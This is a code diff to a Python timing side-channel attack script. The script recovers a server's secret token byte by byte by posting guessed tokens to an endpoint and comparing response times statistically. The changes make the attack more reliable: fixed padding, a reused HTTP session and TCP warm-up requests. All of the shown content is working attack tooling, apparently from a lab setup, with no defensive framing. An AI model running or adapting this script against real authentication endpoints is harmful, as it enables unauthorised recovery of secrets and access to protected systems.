@@ -4,12 +4,12 @@ Byte-by-byte secret recovery via timing side-channel analysis.
 
 import csv
 import os
-import random
 import string
 from datetime import datetime, timezone
 from typing import Optional
 
 import numpy as np
+import requests
 
 from measure import measure_timing
 from stats_engine import (
@@ -26,13 +26,14 @@ ALPHABET = string.ascii_letters + string.digits
 
 def build_guess(prefix: str, candidate: str, total_length: int) -> str:
     """
-    Build a guess string: known prefix + candidate at current position + random padding.
-    Padding uses random chars so length is always total_length (matches server secret length).
+    Build a guess string: known prefix + candidate at current position + fixed padding.
+    Padding fills to total_length (must match server secret length).
     """
     if len(prefix) + 1 > total_length:
         return prefix[:total_length]
     remaining = total_length - len(prefix) - 1
-    padding = ''.join(random.choices(ALPHABET, k=remaining)) if remaining > 0 else ''
+    # Fixed padding — random suffix would add noise after the candidate byte.
+    padding = 'A' * remaining if remaining > 0 else ''
     return prefix + candidate + padding
 
 
@@ -53,6 +54,14 @@ def attack_position(
     Returns dict with winner, p_value, conclusive, all candidate stats, samples.
     """
     candidate_samples = {}
+    url = base_url.rstrip('/') + endpoint
+    session = requests.Session()
+    # Warm TCP once per position; reuse session across candidates for fair comparison.
+    for _ in range(warmup):
+        try:
+            session.post(url, json={'token': 'warmup' + 'A' * max(0, secret_length - 6)}, timeout=10.0)
+        except requests.RequestException:
+            pass
 
     for candidate in ALPHABET:
         guess = build_guess(prefix, candidate, secret_length)
@@ -60,7 +69,7 @@ def attack_position(
             print(f"  Position {position}: measuring '{candidate}' (guess={guess[:position+1]}...)")
 
         timings = measure_timing(
-            base_url, endpoint, guess, samples=samples, warmup=warmup
+            base_url, endpoint, guess, samples=samples, warmup=0, session=session
         )
         candidate_samples[candidate] = timings
 
@@ -87,7 +96,7 @@ def attack_position(
             for char in [top_char, second_char]:
                 guess = build_guess(prefix, char, secret_length)
                 extra = measure_timing(
-                    base_url, endpoint, guess, samples=batch, warmup=2
+                    base_url, endpoint, guess, samples=batch, warmup=0, session=session
                 )
                 candidate_samples[char] = np.concatenate(
                     [candidate_samples[char], extra]
